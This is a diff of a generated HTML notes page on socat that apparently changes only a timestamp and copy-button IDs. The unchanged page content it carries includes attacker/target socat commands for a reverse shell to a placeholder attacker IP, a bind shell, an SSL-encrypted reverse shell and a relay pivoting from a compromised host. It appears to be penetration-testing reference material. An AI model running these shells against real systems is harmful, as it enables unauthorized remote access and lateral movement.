@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-30 Thu 22:13 -->
+<!-- 2026-07-30 Thu 22:22 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Socat</title>
@@ -991,11 +991,11 @@ dumb pipe.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_330182804a374c32bdd2246e4b07ca5a>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_a32de704775f4f0a80860f1ffd212525>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_330182804a374c32bdd2246e4b07ca5a=document.querySelector('button[name=btn_330182804a374c32bdd2246e4b07ca5a]');
-copyBtnbtn_330182804a374c32bdd2246e4b07ca5a.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Listener (attacker machine)\nsocat file:\`tty\`,raw,echo=0 tcp-listen:4444\n\n# Target — spawns a PTY-backed shell back to the listener\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker-ip>:4444\n`);copyBtnbtn_330182804a374c32bdd2246e4b07ca5a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_330182804a374c32bdd2246e4b07ca5a.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_a32de704775f4f0a80860f1ffd212525=document.querySelector('button[name=btn_a32de704775f4f0a80860f1ffd212525]');
+copyBtnbtn_a32de704775f4f0a80860f1ffd212525.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Listener (attacker machine)\nsocat file:\`tty\`,raw,echo=0 tcp-listen:4444\n\n# Target — spawns a PTY-backed shell back to the listener\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker-ip>:4444\n`);copyBtnbtn_a32de704775f4f0a80860f1ffd212525.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_a32de704775f4f0a80860f1ffd212525.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1012,11 +1012,11 @@ let res = copyTextToClipboard(`# Listener (attacker machine)\nsocat file:\`tty\`
 <h3 id="org035016d">Bind Shell</h3>
 <div class="outline-text-3" id="text-org035016d">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_f99fe003c2a34119ba077e89ac0638cf>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_3c3e3db751a3428eb66b918fa5c90d05>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_f99fe003c2a34119ba077e89ac0638cf=document.querySelector('button[name=btn_f99fe003c2a34119ba077e89ac0638cf]');
-copyBtnbtn_f99fe003c2a34119ba077e89ac0638cf.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Target — listens and waits for the attacker to connect\nsocat tcp-listen:4444,reuseaddr,fork exec:'bash -li',pty,stderr,setsid,sigint,sane\n\n# Attacker connects to it\nsocat file:\`tty\`,raw,echo=0 tcp:<target-ip>:4444\n`);copyBtnbtn_f99fe003c2a34119ba077e89ac0638cf.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f99fe003c2a34119ba077e89ac0638cf.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_3c3e3db751a3428eb66b918fa5c90d05=document.querySelector('button[name=btn_3c3e3db751a3428eb66b918fa5c90d05]');
+copyBtnbtn_3c3e3db751a3428eb66b918fa5c90d05.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Target — listens and waits for the attacker to connect\nsocat tcp-listen:4444,reuseaddr,fork exec:'bash -li',pty,stderr,setsid,sigint,sane\n\n# Attacker connects to it\nsocat file:\`tty\`,raw,echo=0 tcp:<target-ip>:4444\n`);copyBtnbtn_3c3e3db751a3428eb66b918fa5c90d05.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_3c3e3db751a3428eb66b918fa5c90d05.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1033,11 +1033,11 @@ let res = copyTextToClipboard(`# Target — listens and waits for the attacker t
 <h3 id="org8c67114">File Transfer</h3>
 <div class="outline-text-3" id="text-org8c67114">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_372f0359fa744ca9989598a4c2fc400c>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_f3d3ea31ac804099875ea3f405bf3978>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_372f0359fa744ca9989598a4c2fc400c=document.querySelector('button[name=btn_372f0359fa744ca9989598a4c2fc400c]');
-copyBtnbtn_372f0359fa744ca9989598a4c2fc400c.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Receiver\nsocat tcp-listen:4444,reuseaddr file:received_file,create\n\n# Sender\nsocat file:file_to_send tcp:<receiver-ip>:4444\n`);copyBtnbtn_372f0359fa744ca9989598a4c2fc400c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_372f0359fa744ca9989598a4c2fc400c.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_f3d3ea31ac804099875ea3f405bf3978=document.querySelector('button[name=btn_f3d3ea31ac804099875ea3f405bf3978]');
+copyBtnbtn_f3d3ea31ac804099875ea3f405bf3978.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Receiver\nsocat tcp-listen:4444,reuseaddr file:received_file,create\n\n# Sender\nsocat file:file_to_send tcp:<receiver-ip>:4444\n`);copyBtnbtn_f3d3ea31ac804099875ea3f405bf3978.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f3d3ea31ac804099875ea3f405bf3978.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1060,11 +1060,11 @@ shell.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_fd424a8906124f11be5100f0afe0ed5f>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_1698f337f22f4bdb8e33dfa1aa2a0ab3>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_fd424a8906124f11be5100f0afe0ed5f=document.querySelector('button[name=btn_fd424a8906124f11be5100f0afe0ed5f]');
-copyBtnbtn_fd424a8906124f11be5100f0afe0ed5f.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Generate a self-signed cert first\nopenssl req -newkey rsa:2048 -nodes -keyout server.pem -x509 -days 365 -out server.pem\n\n# Listener with SSL\nsocat openssl-listen:4444,cert=server.pem,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane\n\n# Target connects over SSL\nsocat openssl:<attacker-ip>:4444,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane\n`);copyBtnbtn_fd424a8906124f11be5100f0afe0ed5f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_fd424a8906124f11be5100f0afe0ed5f.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_1698f337f22f4bdb8e33dfa1aa2a0ab3=document.querySelector('button[name=btn_1698f337f22f4bdb8e33dfa1aa2a0ab3]');
+copyBtnbtn_1698f337f22f4bdb8e33dfa1aa2a0ab3.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Generate a self-signed cert first\nopenssl req -newkey rsa:2048 -nodes -keyout server.pem -x509 -days 365 -out server.pem\n\n# Listener with SSL\nsocat openssl-listen:4444,cert=server.pem,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane\n\n# Target connects over SSL\nsocat openssl:<attacker-ip>:4444,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane\n`);copyBtnbtn_1698f337f22f4bdb8e33dfa1aa2a0ab3.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_1698f337f22f4bdb8e33dfa1aa2a0ab3.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1090,11 +1090,11 @@ you don't.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_69c23edc5e1d45409e043fa746dbc9e4>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_b93d078d0d0d430abc50176826b45a54>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_69c23edc5e1d45409e043fa746dbc9e4=document.querySelector('button[name=btn_69c23edc5e1d45409e043fa746dbc9e4]');
-copyBtnbtn_69c23edc5e1d45409e043fa746dbc9e4.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Relay all traffic from local port 8080 to a target only reachable\n# from the compromised host\nsocat tcp-listen:8080,reuseaddr,fork tcp:<internal-target-ip>:80\n`);copyBtnbtn_69c23edc5e1d45409e043fa746dbc9e4.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_69c23edc5e1d45409e043fa746dbc9e4.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_b93d078d0d0d430abc50176826b45a54=document.querySelector('button[name=btn_b93d078d0d0d430abc50176826b45a54]');
+copyBtnbtn_b93d078d0d0d430abc50176826b45a54.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Relay all traffic from local port 8080 to a target only reachable\n# from the compromised host\nsocat tcp-listen:8080,reuseaddr,fork tcp:<internal-target-ip>:80\n`);copyBtnbtn_b93d078d0d0d430abc50176826b45a54.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b93d078d0d0d430abc50176826b45a54.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
